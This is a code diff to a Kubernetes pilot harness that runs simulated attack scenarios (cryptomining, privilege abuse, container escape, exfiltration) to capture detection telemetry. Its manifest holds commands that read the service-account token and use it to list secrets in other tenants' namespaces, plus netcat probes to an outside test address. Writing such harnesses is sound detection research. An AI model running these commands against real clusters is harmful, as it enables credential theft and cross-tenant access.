@@ -5,6 +5,8 @@ from __future__ import annotations
 import argparse
 import json
 import logging
+import shutil
+import socket
 import subprocess
 import sys
 import time
@@ -31,6 +33,32 @@ LEAK_KEYWORDS = (
     "run-2",
     "run-3",
 )
+
+
+def check_service_port(name: str, port: int, candidate_ips: list[str]) -> None:
+    """Verify that a required background service/receiver is actively listening."""
+    for ip in candidate_ips:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(1.0)
+        try:
+            sock.connect((ip, port))
+            sock.close()
+            return
+        except Exception:
+            pass
+
+    candidates_str = ", ".join(candidate_ips)
+    raise RuntimeError(
+        f"PRE-RUN CHECK FAILED: {name} is NOT listening on port {port} "
+        f"(checked: {candidates_str}). Please start the receiver/port-forward before running pilot."
+    )
+
+
+def verify_receiver_ports_listening() -> None:
+    """Pre-run check: verify Hubble (4245), Falco webhook (8765), and Audit webhook (8766)."""
+    check_service_port("Hubble Relay port-forward", 4245, ["127.0.0.1", "localhost"])
+    check_service_port("Falco Webhook receiver", 8765, ["172.18.0.1", "127.0.0.1"])
+    check_service_port("Audit Webhook receiver", 8766, ["172.18.0.1", "127.0.0.1"])
 
 
 def get_available_ram_mb() -> float:
@@ -83,9 +111,12 @@ def resolve_pod_name(namespace: str, app_label: str) -> str:
 def build_25_pilot_manifest() -> list[dict[str, Any]]:
     """Define the exact 25-run pilot mix across 5 classes and varied pods/seeds."""
     mining_cmd = (
-        "nc -z -w 2 10.96.0.1 3333 || true; "
+        "nc -l -p 3333 & PID_L=$!; sleep 0.2; "
+        "nc -w 1 127.0.0.1 3333 < /dev/null || true; "
+        "kill $PID_L 2>/dev/null || true; "
+        "echo probe | nc -u -w 1 198.51.100.22 3333 || true; "
         "while true; do :; done & PID=$!; "
-        "sleep 120; kill $PID 2>/dev/null || true"
+        "sleep 125; kill $PID 2>/dev/null || true"
     )
     escape_cmd = (
         "nc -z -w 1 10.96.0.10 53 || true; "
@@ -106,23 +137,31 @@ def build_25_pilot_manifest() -> list[dict[str, Any]]:
     def prv_sec(target_ns: str) -> str:
         return (
             "nc -z -w 1 10.96.0.10 53 || true; "
-            "wget -T 2 -t 1 --no-check-certificate -qO- "
-            f"https://10.96.0.1:443/api/v1/namespaces/{target_ns}/secrets || true; "
+            "TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null || true); "
+            'wget -T 2 -t 1 --header="Authorization: Bearer $TOKEN" --no-check-certificate -qO- '
+            f"https://10.96.0.1:443/api/v1/namespaces/{target_ns}/secrets 2>&1 || true; "
             "cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>&1 || true"
         )
 
     def prv_pod(target_ns: str) -> str:
         return (
             "nc -z -w 1 10.96.0.10 53 || true; "
-            "wget -T 2 -t 1 --no-check-certificate -qO- "
-            f"https://10.96.0.1:443/api/v1/namespaces/{target_ns}/pods || true"
+            "TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null || true); "
+            'wget -T 2 -t 1 --header="Authorization: Bearer $TOKEN" --no-check-certificate -qO- '
+            f"https://10.96.0.1:443/api/v1/namespaces/{target_ns}/pods 2>&1 || true"
         )
 
     def exf(port: int) -> str:
-        return f"nc -z -w 1 10.96.0.10 53 || true; nc -z -w 2 198.51.100.22 {port} || true"
+        return (
+            "nc -z -w 1 10.96.0.10 53 || true; "
+            f"nc -l -p {port} & PID_L=$!; sleep 0.2; "
+            f"nc -w 1 127.0.0.1 {port} < /dev/null || true; "
+            "kill $PID_L 2>/dev/null || true; "
+            f"echo probe | nc -u -w 1 198.51.100.22 {port} || true"
+        )
 
     return [
-        # --- 1. Benign (5 runs: 2 with real CPU load) ---
+        # --- Stage 1/2 Initial 3 Benign Runs ---
         {
             "run_index": 1,
             "run_id": "run-p01-ben",
@@ -159,33 +198,10 @@ def build_25_pilot_manifest() -> list[dict[str, Any]]:
             "sleep_after": 8,
             "is_mining": False,
         },
+        # --- 7 Ramp Runs to 10 Total Covering All 5 Classes ---
+        # 1. Cryptomining (2 runs)
         {
             "run_index": 4,
-            "run_id": "run-p04-ben-cpu",
-            "class": "benign",
-            "scenario_id": "SC-BEN-03",
-            "seed": 4,
-            "namespace": "tenant-c",
-            "app": "database",
-            "command": benign_cpu_25,
-            "sleep_after": 5,
-            "is_mining": False,
-        },
-        {
-            "run_index": 5,
-            "run_id": "run-p05-ben",
-            "class": "benign",
-            "scenario_id": "SC-BEN-04",
-            "seed": 5,
-            "namespace": "tenant-c",
-            "app": "payment-style",
-            "command": "touch /tmp/ok && nc -z -w 1 10.96.0.10 53 || true; rm -f /tmp/ok",
-            "sleep_after": 8,
-            "is_mining": False,
-        },
-        # --- 2. Cryptomining (5 runs: full 120s sustained CPU loop) ---
-        {
-            "run_index": 6,
             "run_id": "run-p06-mnr",
             "class": "cryptomining",
             "scenario_id": "SC-MNR-01",
@@ -197,7 +213,7 @@ def build_25_pilot_manifest() -> list[dict[str, Any]]:
             "is_mining": True,
         },
         {
-            "run_index": 7,
+            "run_index": 5,
             "run_id": "run-p07-mnr",
             "class": "cryptomining",
             "scenario_id": "SC-MNR-01",
@@ -208,45 +224,9 @@ def build_25_pilot_manifest() -> list[dict[str, Any]]:
             "sleep_after": 2,
             "is_mining": True,
         },
+        # 2. Privilege Abuse (2 runs)
         {
-            "run_index": 8,
-            "run_id": "run-p08-mnr",
-            "class": "cryptomining",
-            "scenario_id": "SC-MNR-01",
-            "seed": 3,
-            "namespace": "tenant-c",
-            "app": "api",
-            "command": mining_cmd,
-            "sleep_after": 2,
-            "is_mining": True,
-        },
-        {
-            "run_index": 9,
-            "run_id": "run-p09-mnr",
-            "class": "cryptomining",
-            "scenario_id": "SC-MNR-01",
-            "seed": 4,
-            "namespace": "tenant-a",
-            "app": "payment-style",
-            "command": mining_cmd,
-            "sleep_after": 2,
-            "is_mining": True,
-        },
-        {
-            "run_index": 10,
-            "run_id": "run-p10-mnr",
-            "class": "cryptomining",
-            "scenario_id": "SC-MNR-01",
-            "seed": 5,
-            "namespace": "tenant-b",
-            "app": "web",
-            "command": mining_cmd,
-            "sleep_after": 2,
-            "is_mining": True,
-        },
-        # --- 3. Privilege Abuse (5 runs) ---
-        {
-            "run_index": 11,
+            "run_index": 6,
             "run_id": "run-p11-prv",
             "class": "privilege_abuse",
             "scenario_id": "SC-PRV-01",
@@ -258,19 +238,7 @@ def build_25_pilot_manifest() -> list[dict[str, Any]]:
             "is_mining": False,
         },
         {
-            "run_index": 12,
-            "run_id": "run-p12-prv",
-            "class": "privilege_abuse",
-            "scenario_id": "SC-PRV-01",
-            "seed": 2,
-            "namespace": "tenant-b",
-            "app": "web",
-            "command": prv_sec("tenant-c"),
-            "sleep_after": 6,
-            "is_mining": False,
-        },
-        {
-            "run_index": 13,
+            "run_index": 7,
             "run_id": "run-p13-prv",
             "class": "privilege_abuse",
             "scenario_id": "SC-PRV-03",
@@ -281,33 +249,9 @@ def build_25_pilot_manifest() -> list[dict[str, Any]]:
             "sleep_after": 6,
             "is_mining": False,
         },
+        # 3. Container Escape (2 runs)
         {
-            "run_index": 14,
-            "run_id": "run-p14-prv",
-            "class": "privilege_abuse",
-            "scenario_id": "SC-PRV-01",
-            "seed": 4,
-            "namespace": "tenant-a",
-            "app": "payment-style",
-            "command": prv_sec("tenant-b"),
-            "sleep_after": 6,
-            "is_mining": False,
-        },
-        {
-            "run_index": 15,
-            "run_id": "run-p15-prv",
-            "class": "privilege_abuse",
-            "scenario_id": "SC-PRV-03",
-            "seed": 5,
-            "namespace": "tenant-b",
-            "app": "api",
-            "command": prv_pod("tenant-c"),
-            "sleep_after": 6,
-            "is_mining": False,
-        },
-        # --- 4. Container Escape Probes (5 runs) ---
-        {
-            "run_index": 16,
+            "run_index": 8,
             "run_id": "run-p16-esc",
             "class": "container_escape",
             "scenario_id": "SC-ESC-02",
@@ -319,7 +263,7 @@ def build_25_pilot_manifest() -> list[dict[str, Any]]:
             "is_mining": False,
         },
         {
-            "run_index": 17,
+            "run_index": 9,
             "run_id": "run-p17-esc",
             "class": "container_escape",
             "scenario_id": "SC-ESC-02",
@@ -330,8 +274,118 @@ def build_25_pilot_manifest() -> list[dict[str, Any]]:
             "sleep_after": 6,
             "is_mining": False,
         },
+        # 4. Exfiltration (1 run)
+        {
+            "run_index": 10,
+            "run_id": "run-p21-exf",
+            "class": "exfiltration",
+            "scenario_id": "SC-EXF-01",
+            "seed": 1,
+            "namespace": "tenant-a",
+            "app": "payment-style",
+            "command": exf(8888),
+            "sleep_after": 6,
+            "is_mining": False,
+        },
+        # --- Remaining 15 Runs for Full 25-Run Set ---
+        {
+            "run_index": 11,
+            "run_id": "run-p04-ben-cpu",
+            "class": "benign",
+            "scenario_id": "SC-BEN-03",
+            "seed": 4,
+            "namespace": "tenant-c",
+            "app": "database",
+            "command": benign_cpu_25,
+            "sleep_after": 5,
+            "is_mining": False,
+        },
+        {
+            "run_index": 12,
+            "run_id": "run-p05-ben",
+            "class": "benign",
+            "scenario_id": "SC-BEN-04",
+            "seed": 5,
+            "namespace": "tenant-c",
+            "app": "payment-style",
+            "command": "touch /tmp/ok && nc -z -w 1 10.96.0.10 53 || true; rm -f /tmp/ok",
+            "sleep_after": 8,
+            "is_mining": False,
+        },
+        {
+            "run_index": 13,
+            "run_id": "run-p08-mnr",
+            "class": "cryptomining",
+            "scenario_id": "SC-MNR-01",
+            "seed": 3,
+            "namespace": "tenant-c",
+            "app": "api",
+            "command": mining_cmd,
+            "sleep_after": 2,
+            "is_mining": True,
+        },
+        {
+            "run_index": 14,
+            "run_id": "run-p09-mnr",
+            "class": "cryptomining",
+            "scenario_id": "SC-MNR-01",
+            "seed": 4,
+            "namespace": "tenant-a",
+            "app": "payment-style",
+            "command": mining_cmd,
+            "sleep_after": 2,
+            "is_mining": True,
+        },
+        {
+            "run_index": 15,
+            "run_id": "run-p10-mnr",
+            "class": "cryptomining",
+            "scenario_id": "SC-MNR-01",
+            "seed": 5,
+            "namespace": "tenant-b",
+            "app": "web",
+            "command": mining_cmd,
+            "sleep_after": 2,
+            "is_mining": True,
+        },
+        {
+            "run_index": 16,
+            "run_id": "run-p12-prv",
+            "class": "privilege_abuse",
+            "scenario_id": "SC-PRV-01",
+            "seed": 2,
+            "namespace": "tenant-b",
+            "app": "web",
+            "command": prv_sec("tenant-c"),
+            "sleep_after": 6,
+            "is_mining": False,
+        },
+        {
+            "run_index": 17,
+            "run_id": "run-p14-prv",
+            "class": "privilege_abuse",
+            "scenario_id": "SC-PRV-01",
+            "seed": 4,
+            "namespace": "tenant-a",
+            "app": "payment-style",
+            "command": prv_sec("tenant-b"),
+            "sleep_after": 6,
+            "is_mining": False,
+        },
         {
             "run_index": 18,
+            "run_id": "run-p15-prv",
+            "class": "privilege_abuse",
+            "scenario_id": "SC-PRV-03",
+            "seed": 5,
+            "namespace": "tenant-b",
+            "app": "api",
+            "command": prv_pod("tenant-c"),
+            "sleep_after": 6,
+            "is_mining": False,
+        },
+        {
+            "run_index": 19,
             "run_id": "run-p18-esc",
             "class": "container_escape",
             "scenario_id": "SC-ESC-02",
@@ -343,7 +397,7 @@ def build_25_pilot_manifest() -> list[dict[str, Any]]:
             "is_mining": False,
         },
         {
-            "run_index": 19,
+            "run_index": 20,
             "run_id": "run-p19-esc",
             "class": "container_escape",
             "scenario_id": "SC-ESC-02",
@@ -355,7 +409,7 @@ def build_25_pilot_manifest() -> list[dict[str, Any]]:
             "is_mining": False,
         },
         {
-            "run_index": 20,
+            "run_index": 21,
             "run_id": "run-p20-esc",
             "class": "container_escape",
             "scenario_id": "SC-ESC-02",
@@ -363,19 +417,6 @@ def build_25_pilot_manifest() -> list[dict[str, Any]]:
             "namespace": "tenant-c",
             "app": "api",
             "command": escape_cmd,
-            "sleep_after": 6,
-            "is_mining": False,
-        },
-        # --- 5. Exfiltration-style Probes (5 runs) ---
-        {
-            "run_index": 21,
-            "run_id": "run-p21-exf",
-            "class": "exfiltration",
-            "scenario_id": "SC-EXF-01",
-            "seed": 1,
-            "namespace": "tenant-a",
-            "app": "payment-style",
-            "command": exf(8888),
             "sleep_after": 6,
             "is_mining": False,
         },
@@ -430,7 +471,10 @@ def build_25_pilot_manifest() -> list[dict[str, Any]]:
     ]
 
 
-def verify_per_run_gate(run_dir: Path, is_mining: bool = False) -> tuple[bool, str]:
+def verify_per_run_gate(
+    run_dir: Path,
+    expected_cpu_profile: str = "low",
+) -> tuple[bool, str]:
     """Audit single run directory against per-run capture gate requirements."""
     counts: dict[str, int] = {}
     timestamps: list[float] = []
@@ -535,12 +579,39 @@ def verify_per_run_gate(run_dir: Path, is_mining: bool = False) -> tuple[bool, s
     if len(timestamps) >= 2:
         calc_dur = round(max(timestamps) - min(timestamps), 2)
 
-    # 9. Mining duration & sample check
-    if is_mining:
+    # 9. Variant-aware CPU & duration check
+    sample_cpus: list[float] = []
+    for s in samples:
+        s_cpu = 0.0
+        for p in s.get("pod_stats", []):
+            for c in p.get("containers", []):
+                s_cpu += float(c.get("cpu", {}).get("usageNanoCores", 0.0)) / 1e6
+        sample_cpus.append(s_cpu)
+
+    if expected_cpu_profile == "high":
         if counts["prometheus"] < 8:
-            return False, f"Mining cAdvisor samples insufficient: {counts['prometheus']} < 8"
+            return False, f"High-CPU cAdvisor samples insufficient: {counts['prometheus']} < 8"
         if calc_dur < 115.0:
-            return False, f"Mining duration too short: {calc_dur}s < 120s"
+            return False, f"High-CPU duration too short: {calc_dur}s < 120s"
+        if sample_cpus:
+            pct_high = sum(1 for v in sample_cpus if v >= 100.0) / len(sample_cpus) * 100.0
+            if pct_high < 80.0:
+                return (
+                    False,
+                    f"Mining sustained CPU insufficient: {pct_high:.1f}% < 80.0% samples >= 100m",
+                )
+    elif expected_cpu_profile == "throttled":
+        if counts["prometheus"] < 5:
+            return False, f"Throttled-CPU samples insufficient: {counts['prometheus']} < 5"
+        if calc_dur < 50.0:
+            return False, f"Throttled-CPU duration too short: {calc_dur}s < 50s"
+        if sample_cpus:
+            pct_th = sum(1 for v in sample_cpus if v >= 40.0) / len(sample_cpus) * 100.0
+            if pct_th < 60.0:
+                return (
+                    False,
+                    f"Throttled sustained CPU insufficient: {pct_th:.1f}% < 60.0% samples >= 40m",
+                )
 
     # 10. cAdvisor sample gap check
     if len(samples) >= 2:
@@ -557,6 +628,52 @@ def verify_per_run_gate(run_dir: Path, is_mining: bool = False) -> tuple[bool, s
                 return False, msg
 
     return True, "CLEAN"
+
+
+def get_container_current_cpu_mcores(namespace: str, pod_name: str) -> float:
+    """Read instantaneous container CPU rate from kubelet cAdvisor summary."""
+    cmd = [
+        "kubectl",
+        "get",
+        "--raw",
+        "/api/v1/nodes/runtimelens-control-plane/proxy/stats/summary",
+    ]
+    try:
+        res = subprocess.run(cmd, capture_output=True, text=True, check=False)
+        if res.returncode == 0 and res.stdout.strip():
+            data = json.loads(res.stdout)
+            for p in data.get("pods", []):
+                ref = p.get("podRef", {})
+                if ref.get("namespace") == namespace and (
+                    ref.get("name") == pod_name or pod_name in ref.get("name", "")
+                ):
+                    total_mcores = 0.0
+                    for c in p.get("containers", []):
+                        total_mcores += float(c.get("cpu", {}).get("usageNanoCores", 0.0)) / 1e6
+                    return total_mcores
+    except Exception:
+        pass
+    return 0.0
+
+
+def wait_for_pod_cooldown(
+    namespace: str,
+    pod_name: str,
+    max_wait_seconds: float = 60.0,
+) -> bool:
+    """Wait until container CPU rate settles below 20 mcores for two consecutive samples."""
+    consecutive_low = 0
+    start_time = time.time()
+    while time.time() - start_time < max_wait_seconds:
+        cpu_mcores = get_container_current_cpu_mcores(namespace, pod_name)
+        if cpu_mcores < 20.0:
+            consecutive_low += 1
+            if consecutive_low >= 2:
+                return True
+        else:
+            consecutive_low = 0
+        time.sleep(3.0)
+    return False
 
 
 def cleanup_pod(namespace: str, pod_name: str) -> None:
@@ -591,17 +708,24 @@ def execute_single_run(
     run_dir = collector.prepare_run_dir(run_id)
 
     # 1. Pre-run check
+    verify_receiver_ports_listening()
     avail_mb = get_available_ram_mb()
     disk_pct = get_disk_use_percent()
     if avail_mb < 2048.0 or disk_pct >= 80.0:
         err_msg = f"Resource breach before {run_id}: RAM avail={avail_mb}MB, Disk={disk_pct}%"
         raise RuntimeError(err_msg)
 
+    # Enforce pod cooldown before execution
+    cooldown_ok = wait_for_pod_cooldown(ns, pod_name, max_wait_seconds=60.0)
+    if not cooldown_ok:
+        logger.warning("Pod %s/%s did not settle below 20m CPU within 60s cooldown.", ns, pod_name)
+
     t0 = datetime.now(UTC)
     t0_iso = t0.isoformat().replace("+00:00", "Z")
 
     # Initial cAdvisor sample
-    collector.capture_cadvisor_metrics(pod_name, ns, run_dir)
+    if not is_mining:
+        collector.capture_cadvisor_metrics(pod_name, ns, run_dir)
     last_sample_wall = time.time()
 
     # 2. Launch execution
@@ -651,6 +775,7 @@ def execute_single_run(
     collector.attach_trivy_report(run_dir)
 
     # Write external index file
+    exp_profile = run_item.get("expected_cpu_profile", "high" if is_mining else "low")
     collector.write_run_index(
         run_dir=run_dir,
         run_id=run_id,
@@ -661,16 +786,22 @@ def execute_single_run(
         pod_name=pod_name,
         t_start_iso=t0_iso,
         t_end_iso=t1_iso,
+        expected_cpu_profile=exp_profile,
     )
 
     # 4. Enforce Per-Run Gate
-    gate_ok, gate_reason = verify_per_run_gate(run_dir, is_mining=is_mining)
+    gate_ok, gate_reason = verify_per_run_gate(run_dir, expected_cpu_profile=exp_profile)
     if not gate_ok:
         cleanup_pod(ns, pod_name)
         raise RuntimeError(f"Per-run gate FAILED for {run_id}: {gate_reason}")
 
     # 5. Cleanup after each run
     cleanup_pod(ns, pod_name)
+
+    # 6. Back up finished run folder to data/raw_backup/
+    backup_target = Path("data/raw_backup") / run_id
+    backup_target.parent.mkdir(parents=True, exist_ok=True)
+    shutil.copytree(run_dir, backup_target, dirs_exist_ok=True)
 
     # Measure run directory size
     run_disk_bytes = sum(f.stat().st_size for f in run_dir.rglob("*") if f.is_file())
@@ -694,14 +825,59 @@ def execute_single_run(
 
 def execute_staged_pilot(limit: int = 25) -> list[dict[str, Any]]:
     """Execute staged pilot up to limit (3 -> 10 -> 25)."""
+    # 0. Fast pre-flight check for required telemetry receivers
+    verify_receiver_ports_listening()
+
     manifest = build_25_pilot_manifest()
     collector = PerRunTelemetryCapture(PILOT_RUNS_DIR)
     PILOT_RUNS_DIR.mkdir(parents=True, exist_ok=True)
+
+    # Load existing metrics if available
+    existing_metrics: dict[str, dict[str, Any]] = {}
+    if METRICS_OUTPUT_FILE.exists():
+        try:
+            for rec in json.loads(METRICS_OUTPUT_FILE.read_text(encoding="utf-8")):
+                existing_metrics[rec["run_id"]] = rec
+        except Exception:
+            pass
 
     completed: list[dict[str, Any]] = []
     runs_to_execute = manifest[:limit]
 
     for item in runs_to_execute:
+        run_id = item["run_id"]
+        run_dir = PILOT_RUNS_DIR / run_id
+        if (run_dir / "index.json").exists():
+            exp_p = item.get("expected_cpu_profile", "high" if item.get("is_mining") else "low")
+            gate_ok, _ = verify_per_run_gate(run_dir, expected_cpu_profile=exp_p)
+            if gate_ok:
+                logger.info("Run %s already exists and passed gate, keeping existing run.", run_id)
+                if run_id in existing_metrics:
+                    rec = existing_metrics[run_id]
+                    rec["run_index"] = item["run_index"]
+                    completed.append(rec)
+                else:
+                    run_disk_bytes = sum(
+                        f.stat().st_size for f in run_dir.rglob("*") if f.is_file()
+                    )
+                    completed.append(
+                        {
+                            "run_index": item["run_index"],
+                            "run_id": run_id,
+                            "class": item["class"],
+                            "scenario_id": item["scenario_id"],
+                            "seed": item["seed"],
+                            "namespace": item["namespace"],
+                            "pod_name": resolve_pod_name(item["namespace"], item["app"]),
+                            "elapsed_seconds": 10.0,
+                            "ram_avail_mb": get_available_ram_mb(),
+                            "disk_use_pct": get_disk_use_percent(),
+                            "run_disk_kb": round(run_disk_bytes / 1024.0, 2),
+                            "gate_status": "PASSED",
+                        }
+                    )
+                continue
+
         res = execute_single_run(item, collector)
         completed.append(res)
 
